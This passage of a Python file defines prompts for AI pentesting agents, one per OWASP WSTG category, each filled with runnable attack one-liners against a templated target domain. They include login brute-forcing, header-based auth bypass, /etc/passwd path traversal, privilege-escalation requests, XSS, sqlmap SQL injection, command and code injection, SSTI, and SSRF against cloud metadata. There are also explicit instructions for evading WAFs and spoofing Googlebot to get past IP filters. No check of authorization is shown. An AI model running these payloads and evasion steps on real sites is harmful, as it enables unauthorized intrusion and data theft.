      -d "username=admin@{{domain}}&password=wrongpass$i" \
      -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null)
    echo "Attempt $i: HTTP $code"
  done

[ATHN-04] Bypassing Authentication Schema
  curl -L -4 -si https://{{domain}}/admin/ -H "X-Forwarded-For: 127.0.0.1" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | head -5
  curl -L -4 -si https://{{domain}}/admin -H "X-Original-URL: /" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | head -5
  curl -L -4 -si "https://{{domain}}/login?next=/admin&admin=true" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | head -5

[ATHN-07] Weak Password Policy
  for pass in "1" "123" "password" "abc" "1234567890123456789012345678901234567890"; do
    curl -L -4 -si -X POST https://{{domain}}/register \
      -d "username=poltest&email=pol@mailinator.com&password=$pass" \
      -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null \
      | grep -iE "password|weak|policy|error|invalid|length" | head -2
  done

[ATHN-08] Weak Security Question/Answer
  for p in /forgot-password /password-hint /security-question /recover; do
    code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $p"
  done

[ATHN-09] Weak Password Reset
  curl -L -4 -si -X POST https://{{domain}}/forgot-password \
    -d "email=admin@{{domain}}" \
    -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | head -20
  curl -L -4 -si -X POST https://{{domain}}/reset-password \
    -d "token=123456&password=newpass" \
    -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | head -10

[ATHN-10] Weaker Authentication in Alternative Channel
  for ep in /api/login /api/v1/login /api/v2/login /api/auth /mobile/login /m/login; do
    code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST https://{{domain}}$ep \
      -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt \
      -d '{{"username":"admin","password":"admin"}}' --max-time 10 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $ep"
  done

[ATHN-11] Multi-Factor Authentication
  curl -L -4 -s https://{{domain}}/login -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.9" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 18 2>/dev/null \
    | grep -iE "(2fa|mfa|otp|totp|authenticator|two.factor|verification.code|sms.code)" | head -5

After all checks, list:
FINDING | WSTG-ATHN-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-ATHZ  (ATHZ-01 to 05)
# ─────────────────────────────────────────────────────────────────────────────
ATHZ_AGENT = _agent('ATHZ', 'Authorization Testing', f"""
You are the WSTG-ATHZ agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s.

[ATHZ-01] Directory Traversal / File Include
  python3 -c "import subprocess; ua='{_BUA}'; payloads=['/../../../etc/passwd','/%2e%2e/%2e%2e/etc/passwd','/..%2f..%2fetc%2fpasswd','/?file=../../etc/passwd','/?path=../etc/passwd','/?page=../../../../etc/passwd']; [print('HIT PATH TRAVERSAL:' if any(x in b for x in ['root:x:0','root:!:','bin:x:1']) else 'OK ('+str(len(b))+' bytes)',p) for p in payloads for b in [subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'https://{{domain}}'+p],capture_output=True,text=True,timeout=12).stdout]]"

[ATHZ-02] Bypassing Authorization Schema
  for ep in /api/users /api/admin /admin/ /admin/dashboard; do curl -L -4 -si https://{{domain}}$ep -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null | head -5; echo "--- $ep ---"; done
  curl -L -4 -si https://{{domain}}/admin/ -H "X-Forwarded-For: 127.0.0.1" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null | head -5

[ATHZ-03] Privilege Escalation
  curl -L -4 -si -X POST https://{{domain}}/api/user/update -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"role":"admin","is_admin":true,"privilege":"superuser"}}' --max-time 10 2>/dev/null | head -10
  curl -L -4 -si -X PUT https://{{domain}}/api/user/1 -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"role":"admin"}}' --max-time 10 2>/dev/null | head -10

[ATHZ-04] Insecure Direct Object Reference (IDOR)
  python3 -c "import subprocess; ua='{_BUA}'; paths=['/api/user/','/api/order/','/api/account/','/api/invoice/','/user/profile/','/order/','/account/']; ids=['1','2','3','100','9999']; [print(subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}} '+path+i,'-A',ua,'--max-time','6','https://{{domain}}'+path+i],capture_output=True,text=True,timeout=10).stdout.strip()) for path in paths for i in ids if subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-A',ua,'--max-time','6','https://{{domain}}'+path+i],capture_output=True,text=True,timeout=10).stdout.strip() not in ('404','405','000','')]"

[ATHZ-05] OAuth Weaknesses
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iEo "(oauth|openid|auth0|okta|google.*login|facebook.*login|/.well-known/openid-configuration)" | sort -u
  for p in /.well-known/openid-configuration /oauth/authorize /oauth/token /auth/google /auth/facebook /auth/github; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $p"; done

After all checks, list:
FINDING | WSTG-ATHZ-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-SESS  (SESS-01,02,03,05,06,07,10)
# ─────────────────────────────────────────────────────────────────────────────
SESS_AGENT = _agent('SESS', 'Session Management Testing', f"""
You are the WSTG-SESS agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s.

[SESS-01] Session Management Schema
  curl -L -4 -sc /tmp/cfai_sess.txt -so /dev/null https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" --max-time 12 2>/dev/null
  grep -v "^#\\|^$" /tmp/cfai_sess.txt 2>/dev/null || echo "No cookies"

[SESS-02] Cookie Attributes
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -i "set-cookie"
  curl -L -4 -sI https://{{domain}}/login -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -i "set-cookie"
  curl -L -4 -sI https://{{domain}}/account -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -i "set-cookie"

[SESS-03] Session Fixation
  curl -L -4 -sc /tmp/sess_pre.txt -so /dev/null https://{{domain}}/ -A "{_BUA}" --max-time 12 2>/dev/null
  grep -v "^#\\|^$" /tmp/sess_pre.txt 2>/dev/null | awk '{{print $NF}}' | head -3

[SESS-05] Cross Site Request Forgery (CSRF)
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "(csrf|_token|authenticity_token|__RequestVerificationToken|X-CSRF)" | head -5
  curl -L -4 -s https://{{domain}}/login -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "csrf|_token|nonce" | head -5
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | grep -iE "samesite"

[SESS-06] Logout Functionality
  for p in /logout /signout /sign-out /api/logout /user/logout /account/logout; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "000" ] && echo "$code $p"; done

[SESS-07] Session Timeout
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | grep -iE "cache-control|pragma|expires|max-age"
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "(session.timeout|idle.timeout|auto.logout|inactivity)" | head -5

[SESS-10] JSON Web Tokens (JWT)
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -Eo "eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+" | head -3
  for ep in /api /api/v1 /api/auth /api/token; do curl -L -4 -sI https://{{domain}}$ep -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null | grep -iE "authorization|bearer|jwt" | head -2; done

After all checks, list:
FINDING | WSTG-SESS-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-INPV  (INPV-01,02,05,11,12,18,19)
# ─────────────────────────────────────────────────────────────────────────────
INPV_AGENT = _agent('INPV', 'Input Validation Testing', f"""
You are the WSTG-INPV agent. Target: {{domain}}

CRITICAL: Use subprocess curl (NOT urllib — urllib stalls on VPS SSL). Every curl needs -L -4 -A "{_BUA}".

WAF BYPASS: If you get 403/429 responses, the target has a WAF. Before retrying:
1. Add random delays (time.sleep(1)) between requests
2. Use sqlmap tamper scripts: --tamper=between,randomcase,space2comment --delay=2 --random-agent
3. Try lowercase/mixed-case payloads: <ScRiPt>, SeLeCt instead of SELECT
4. Use URL encoding variants: %3cscript%3e, %27 OR %271%27=%271
5. Fragment payloads with comments: SE/**/LECT, <sc/**/ript>
6. After WAF bypass, VERIFY injections: a phpinfo() hit is ONLY confirmed if the response
   contains the actual PHP info table (PHP Version header row), NOT just the word 'phpinfo' echoed back.

[INPV-01] Reflected XSS
  # Payloads are URL-encoded to avoid shell quoting issues — unquote() decodes at runtime
  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; enc=['%3cscript%3ealert(1)%3c%2fscript%3e','%22%27%3e%3cimg+src%3dx+onerror%3dalert(1)%3e','%3csvg+onload%3dalert(1)%3e']; payloads=[urllib.parse.unquote(p) for p in enc]; params=['q','search','s','query','keyword','name','input']; run=lambda u: (time.sleep(0.2) or subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout[:3000]); [print('REFLECTED XSS:',u) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] if pl in run(u)]"

[INPV-02] Stored XSS
  for ep in /comment /review /contact /feedback /post /message; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST "https://{{domain}}$ep" -d "comment=<script>alert(xss_test)</script>&name=tester&email=t@mailinator.com" -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code POST $ep"; done

[INPV-05] SQL Injection
  sqlmap -u "https://{{domain}}/?id=1" --batch --level=1 --risk=1 --timeout=20 --random-agent --delay=2 --tamper=between,randomcase,space2comment --ignore-code=403,429 --output-dir=/tmp/sqli_{{domain}} 2>/dev/null | tail -20 || echo "(sqlmap not available)"
  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; errors=['sql syntax','mysql error','ora-0','sqlite_','pg_query','postgresql error','syntax error near','unclosed quotation']; payloads=[chr(39),'1 OR 1=1','1 UNION SELECT 1--','1'+chr(39)+' ORDER BY 1--']; params=['id','cat','page','product','item','user']; run=lambda u: (time.sleep(0.5) or subprocess.run(['curl','-L','-4','-sk','--max-time','10','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=14).stdout.lower()); [print('SQL ERROR:',u) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] if any(e in run(u) for e in errors)]"

[INPV-11] Code Injection
  # IMPORTANT: Only flag as confirmed if response contains ACTUAL PHP execution output,
  # NOT just the word 'phpinfo' echoed back from the URL. Look for PHP Version table rows.
  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; payloads=['phpinfo()','system(id)','passthru(id)']; params=['page','template','include','module','file','action','view']; run=lambda u: (time.sleep(0.3) or subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout); [print('CODE INJECTION CONFIRMED:',u) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] for body in [run(u)] if any(x in body for x in ['uid=0(','uid=1(','PHP Version </td>','<title>phpinfo()</title>','System </td>','www-data</td>'])]"

[INPV-12] Command Injection
  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; payloads=['; id','| id','; whoami','& whoami']; params=['ip','host','cmd','exec','command','ping','target']; run=lambda u: (time.sleep(0.3) or subprocess.run(['curl','-L','-4','-sk','--max-time','10','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=14).stdout); [print('CMD INJECTION:',u,body[:120]) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] for body in [run(u)] if 'uid=0(' in body or 'uid=1(' in body or ('root' in body and '/bin/' in body)]"

[INPV-18] Server-Side Template Injection (SSTI)
  # Payloads are URL-encoded — unquote() decodes at runtime, preventing shell Bad substitution
  # %7b%7b7*7%7d%7d={{7*7}}, %24%7b7*7%7d=${7*7}, %23%7b7*7%7d=#{7*7}, %3c%25%3d+7*7+%25%3e=<%= 7*7 %>
  python3 -c "import subprocess,urllib.parse,time; ua='{_BUA}'; enc=['%7b%7b7*7%7d%7d','%24%7b7*7%7d','%23%7b7*7%7d','%3c%25%3d+7*7+%25%3e']; payloads=[urllib.parse.unquote(p) for p in enc]; params=['name','template','greeting','msg','text','q','search']; run=lambda u: (time.sleep(0.3) or subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout); [print('SSTI HIT (7*7=49):',u,'payload:',pl) for pr in params for pl in payloads for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(pl)] for body in [run(u)] if '49' in body and '49' not in pr]"

[INPV-19] Server-Side Request Forgery (SSRF)
  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; params=['url','path','redirect','uri','dest','target','src','callback','webhook','fetch','proxy']; dsts=['http://169.254.169.254/latest/meta-data/','http://127.0.0.1/','http://localhost/']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout; [print('SSRF HIT:',u) for pr in params for dst in dsts for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(dst)] if any(x in run(u) for x in ['ami-id','instance-id','local-ipv4','root:x:0'])]"

After all checks, list:
FINDING | WSTG-INPV-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-CRYP  (CRYP-01, 03)
# ─────────────────────────────────────────────────────────────────────────────
CRYP_AGENT = _agent('CRYP', 'Cryptography Testing', f"""
You are the WSTG-CRYP agent. Target: {{domain}}

CRITICAL: Use curl for TLS (NOT openssl s_client — it hangs on virtual-hosted servers that need SNI+Host).
Every curl MUST have -L -4 -A "{_BUA}".

[CRYP-01] Weak Transport Layer Security
  nmap -Pn --script ssl-enum-ciphers -p 443 {{domain}} 2>/dev/null | grep -E "TLS|SSL|cipher|WEAK|WARN|ERROR|least strength|NULL|EXPORT|RC4|DES|MD5" | head -30
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "strict-transport-security|hsts"
  python3 -c "import subprocess; ua='{_BUA}'; kw=('subject','issuer','expire','subjectalt','start date','ssl cert','tls'); getcert=lambda args: [l.strip('* ') for l in subprocess.run(args,capture_output=True,text=True,timeout=12).stderr.splitlines() if any(k in l.lower() for k in kw)]; b=['curl','-L','-4','-vsk','--max-time','10','--connect-timeout','6']; tries=[b+['-A',ua,'-H','X-Forwarded-For: 66.249.66.1','-H','X-Real-IP: 66.249.66.1','-H','Referer: https://www.google.com/','https://{{domain}}/'],b+['-A',ua,'https://www.{{domain}}/'],b+['-A','Googlebot/2.1 (+http://www.google.com/bot.html)','-H','From: googlebot(at)googlebot.com','https://{{domain}}/'],b+['--http1.0','-A',ua,'https://{{domain}}/' ]]; found=next((r for a in tries for r in [getcert(a)] if r),[]); [print(l) for l in found[:20]] or print('(TLS: VPS IP filtered — all 4 bypass attempts failed)')"

[CRYP-03] Sensitive Info over Unencrypted Channels
  code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" http://{{domain}}/ -A "{_BUA}" --max-time 10 2>/dev/null)
  loc=$(curl -L -4 -sI http://{{domain}}/ -A "{_BUA}" --max-time 10 2>/dev/null | grep -i "^location:")
  echo "HTTP: $code  $loc"
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "strict-transport-security|hsts|includeSubDomains|preload"
  curl -L -4 -s http://{{domain}}/login -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | grep -iE "(action=.http:|method=.post)" | head -3

After all checks, list:
FINDING | WSTG-CRYP-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-CLNT  (CLNT-01,02,03,04,12,13)
# ─────────────────────────────────────────────────────────────────────────────
CLNT_AGENT = _agent('CLNT', 'Client-Side Testing', f"""
You are the WSTG-CLNT agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s.

[CLNT-01] DOM-Based XSS
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "(document[.]write[(]|innerHTML=|outerHTML=|eval[(]|location[.]hash|location[.]search|document[.]URL|document[.]referrer)" | head -15

[CLNT-02] JavaScript Execution
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -Eo 'src="[^"]*[.]js[^"]*"' | head -15
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "(eval[(]|setTimeout[(]|setInterval[(]|new Function[(])" | head -8

[CLNT-03] HTML Injection
  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; marker='<h1>cfai_html_test_12345</h1>'; params=['name','q','search','msg','text','input','greeting','title']; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=12).stdout; [print('HTML INJECTION:',u) for pr in params for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(marker)] if marker in run(u)]"

[CLNT-04] Client-Side URL Redirect
  python3 -c "import subprocess,urllib.parse; ua='{_BUA}'; params=['redirect','url','next','return','dest','goto','redir','target','continue','forward','r','to','returnUrl']; evil='https://evil-test.example.com'; run=lambda u: subprocess.run(['curl','-4','-sk','--max-time','8','-A',ua,'--max-redirs','0','-w','%{{url_effective}}','-o','/dev/null',u],capture_output=True,text=True,timeout=12).stdout; [print('OPEN REDIRECT:',u,'->',out) for pr in params for u in ['https://{{domain}}/?'+pr+'='+urllib.parse.quote(evil)] for out in [run(u)] if 'evil-test.example.com' in out]"

[CLNT-12] Browser Storage
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -iE "(localStorage[.](setItem|getItem)|sessionStorage[.](setItem|getItem)|indexedDB[.]open|document[.]cookie=)" | head -10

[CLNT-13] Cross-Site Script Inclusion
  curl -L -4 -s https://{{domain}}/ -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | grep -Eo 'src="https?://[^"]*[.]js[^"]*"' | head -15
  for ep in /api/jsonp /callback /json /data; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" "https://{{domain}}$ep?callback=test" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "404" ] && echo "$code JSONP? $ep?callback=test"; done

After all checks, list:
FINDING | WSTG-CLNT-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-APIT  (APIT-01, 02, 99)
# ─────────────────────────────────────────────────────────────────────────────
APIT_AGENT = _agent('APIT', 'API Security Testing', f"""
You are the WSTG-APIT agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s.

[APIT-01] API Reconnaissance
  for ep in /api /api/v1 /api/v2 /api/v3 /v1 /v2 /rest /swagger.json /openapi.json /api-docs /swagger-ui.html /redoc /.well-known; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$ep -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code https://{{domain}}$ep"; done
  curl -L -4 -sI https://{{domain}}/api/v1 -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 8 2>/dev/null | grep -iE "allow|content-type|access-control"

[APIT-02] Broken Object Level Authorization (BOLA/IDOR)
  python3 -c "import subprocess; ua='{_BUA}'; paths=['/api/user/','/api/v1/user/','/api/order/','/api/v1/order/','/api/account/','/api/invoice/','/api/document/','/api/file/']; ids=['1','2','3','100','9999','0','admin']; run=lambda u: subprocess.run(['curl','-L','-4','-so','/dev/null','-w','%{{http_code}}','-A',ua,'--max-time','8','https://{{domain}}'+u],capture_output=True,text=True,timeout=12).stdout.strip(); [print(c,path+i) for path in paths for i in ids for c in [run(path+i)] if c and c not in ('404','405','410','000','')]"

[APIT-99] GraphQL Security
  for ep in /graphql /api/graphql /gql /graph /graphql/v1; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST "https://{{domain}}$ep" -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"query":"{{__typename}}"}}' --max-time 8 2>/dev/null); if [ "$code" != "404" ] && [ "$code" != "000" ]; then echo "GraphQL: $code https://{{domain}}$ep"; curl -L -4 -s -X POST "https://{{domain}}$ep" -H "Content-Type: application/json" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt -d '{{"query":"{{__schema{{types{{name}}}}}}"}}' --max-time 10 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20; fi; done
  command -v graphql-cop &>/dev/null && graphql-cop -t https://{{domain}}/graphql 2>/dev/null | head -30 || true

After all checks, list:
FINDING | WSTG-APIT-XX | Severity | Evidence
""")


# ── Registry ──────────────────────────────────────────────────────────────────

WSTG_REGISTRY: dict[str, Agent] = {
    'info': INFO_AGENT,
    'conf': CONF_AGENT,
    'idnt': IDNT_AGENT,
    'athn': ATHN_AGENT,
    'athz': ATHZ_AGENT,
    'sess': SESS_AGENT,
    'inpv': INPV_AGENT,
    'cryp': CRYP_AGENT,
    'clnt': CLNT_AGENT,
    'apit': APIT_AGENT,
}

WSTG_ORDER = ['info', 'conf', 'idnt', 'athn', 'athz',
               'sess', 'inpv', 'cryp', 'clnt', 'apit']
